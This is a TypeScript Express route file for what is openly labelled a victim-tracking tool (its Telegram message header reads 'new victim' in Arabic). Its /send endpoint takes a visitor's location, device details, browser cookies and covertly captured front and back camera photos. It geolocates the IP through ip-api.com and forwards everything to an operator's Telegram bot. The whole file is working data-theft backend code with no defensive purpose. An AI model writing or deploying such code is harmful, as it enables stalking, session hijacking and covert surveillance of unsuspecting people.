import { Router, type IRouter } from "express";
import { SendDeviceInfoBody, SendDeviceInfoResponse } from "@workspace/api-zod";
import { isRateLimited, clientIp } from "../lib/rateLimit";

const router: IRouter = Router();

router.post("/send", async (req, res): Promise<void> => {
  const ip = clientIp(req as any);

  if (isRateLimited(ip, 5)) {
    res.status(429).json({ error: "Too many requests" });
    return;
  }

  const parsed = SendDeviceInfoBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const data = parsed.data;
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    req.log.error("BOT_TOKEN or CHAT_ID not set");
    res.status(500).json({ status: "error" });
    return;
  }

  const body = req.body as Record<string, unknown>;

  // جلب IP والشركة من السيرفر
  let realIp = ip;
  let isp = "غير متاح";
  let mobileData = "غير متاح";
  try {
    const ipRes = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,query,isp,org,mobile`,
      { signal: AbortSignal.timeout(5000) }
    );
    const ipData = await ipRes.json() as Record<string, unknown>;
    if (ipData.status === "success") {
      realIp = String(ipData.query ?? ip);
      isp = String(ipData.isp ?? ipData.org ?? "غير متاح");
      mobileData = ipData.mobile ? "📶 داتا موبايل" : "📡 واي فاي / ثابت";
    }
  } catch { /* تجاهل */ }

  const battery = body.battery;
  let batteryStr = "غير متاح";
  if (battery && typeof battery === "object") {
    const b = battery as Record<string, string>;
    batteryStr = `${b.level} | ${b.charging} | شحن: ${b.chargingTime} | تفريغ: ${b.dischargingTime}`;
  } else if (typeof battery === "string") {
    batteryStr = battery;
  }

  const cookies = typeof body.cookies === "string" ? body.cookies : "لا يوجد";

  const message = `
━━━━━━━━━━━━━━━━━━━━━
🎯 ضحية جديدة
━━━━━━━━━━━━━━━━━━━━━

📍 الموقع: ${data.location ?? "مرفوض"}
🌐 IP: ${realIp}
🏢 الشركة: ${isp}
📶 الاتصال: ${mobileData}

━━━━━━━━━━━━━━━━━━━━━
📱 معلومات الجهاز
━━━━━━━━━━━━━━━━━━━━━

💻 الجهاز: ${data.platform}
🖥️ الشاشة: ${data.screen}
🌍 اللغة: ${data.language}
🕒 التوقيت: ${data.timezone}
🔋 البطارية: ${batteryStr}
📷 الكاميرا: ${data.media ?? "مرفوضة"}
🔗 المصدر: ${data.referrer ?? "مباشر"}

━━━━━━━━━━━━━━━━━━━━━
🍪 الكوكيز
━━━━━━━━━━━━━━━━━━━━━
${cookies}

━━━━━━━━━━━━━━━━━━━━━
📋 المنسوخ
━━━━━━━━━━━━━━━━━━━━━
لا يوجد بعد — سيصلك تلقائياً

━━━━━━━━━━━━━━━━━━━━━
🌐 المتصفح
━━━━━━━━━━━━━━━━━━━━━
${data.browser}
  `.trim();

  async function tgSend(method: string, init: RequestInit) {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, init);
    if (!r.ok) req.log.warn({ status: r.status, method }, "Telegram error");
    return r;
  }

  async function sendPhoto(b64: string, caption: string) {
    if (b64.length > 15_000_000) return; // حد 10MB تقريباً بعد base64
    const buf = Buffer.from(b64, "base64");
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID!);
    fd.append("caption", caption);
    fd.append("photo", new Blob([buf], { type: "image/jpeg" }), "photo.jpg");
    await tgSend("sendPhoto", { method: "POST", body: fd });
  }

  let responded = false;
  try {
    const telegramRes = await tgSend("sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    if (!telegramRes.ok) {
      res.status(502).json({ status: "error" });
      responded = true;
      return;
    }

    res.json(SendDeviceInfoResponse.parse({ status: "sent" }));
    responded = true;
  } catch (err) {
    req.log.error({ err }, "Failed to send message to Telegram");
    if (!responded) res.status(502).json({ status: "error" });
    return;
  }

  // إرسال الصور في الخلفية
  const frontPhoto = typeof body.frontPhoto === "string" ? body.frontPhoto : null;
  const backPhoto  = typeof body.backPhoto  === "string" ? body.backPhoto  : null;

  (async () => {
    try { if (frontPhoto) await sendPhoto(frontPhoto, "📸 كاميرا أمامية"); } catch (e) { req.log.warn({ e }, "front photo failed"); }
    try { if (backPhoto)  await sendPhoto(backPhoto,  "📸 كاميرا خلفية");  } catch (e) { req.log.warn({ e }, "back photo failed");  }
  })();
});

export default router;
